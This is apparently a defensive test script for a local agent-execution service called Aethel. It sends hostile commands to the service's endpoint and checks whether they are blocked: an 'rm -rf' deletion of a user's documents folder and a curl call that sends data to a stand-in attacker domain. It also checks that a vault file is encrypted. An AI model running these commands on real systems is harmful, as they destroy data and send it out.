#!/bin/bash

BASE_URL="http://127.0.0.1:9001/aethel/v1/exec"
VAULT_PATH="aethel_vault.db"

echo "🛡️ [AETHEL RED TEAM SUITE] 🛡️"
echo "------------------------------"

# 1. RCE Probing
echo "🚩 [TEST 1]: Remote Code Execution (RCE) - 'rm -rf'..."
RESPONSE=$(curl -s -X POST $BASE_URL \
  -H "Content-Type: application/json" \
  -d '{"command": "rm -rf /Users/garrettbennett/important_docs", "signature": "valid_hardware_sig_12345"}')

echo "   Response: $RESPONSE"
if [[ "$RESPONSE" == *"SECURITY ALERT"* ]]; then
  echo "✅ [RESULT]: RCE Blocked by Aethel Logic Guardian."
else
  echo "❌ [RESULT]: RCE Bypass Detected!"
fi

# 2. Egress Probing
echo -e "\n🚩 [TEST 2]: Data Exfiltration - Unauthorized Domain..."
RESPONSE=$(curl -s -X POST $BASE_URL \
  -H "Content-Type: application/json" \
  -d '{"command": "curl http://malicious-actor.com/steal?data=sensitive", "signature": "valid_hardware_sig_12345"}')

echo "   Response: $RESPONSE"
if [[ "$RESPONSE" == *"BLOCKED"* ]]; then
  echo "✅ [RESULT]: Exfiltration Blocked by Sovereign Egress Manifest."
else
  echo "❌ [RESULT]: Exfiltration Bypass Detected!"
fi

# 3. Vault Probing
echo -e "\n🚩 [TEST 3]: Vault Encryption - Direct Reading..."
if [ -f "$VAULT_PATH" ]; then
    # Attempt to read without SQLCipher key
    TABLES=$(sqlite3 "$VAULT_PATH" "SELECT name FROM sqlite_master WHERE type='table';" 2>&1)
    if [[ "$TABLES" == *"file is not a database"* ]] || [[ "$TABLES" == *"encrypted"* ]] || [[ "$TABLES" == "" ]]; then
      echo "✅ [RESULT]: Vault protected (Encrypted/Inaccessible without key)."
    else
      echo "❌ [RESULT]: Vault is NOT encrypted! Tables: $TABLES"
    fi
else
    echo "⚠️ [SKIP]: Vault file not found. Run 'harden' subcommand first."
fi

echo -e "\n------------------------------"
echo "🛡️  AUDIT COMPLETE 🛡️"
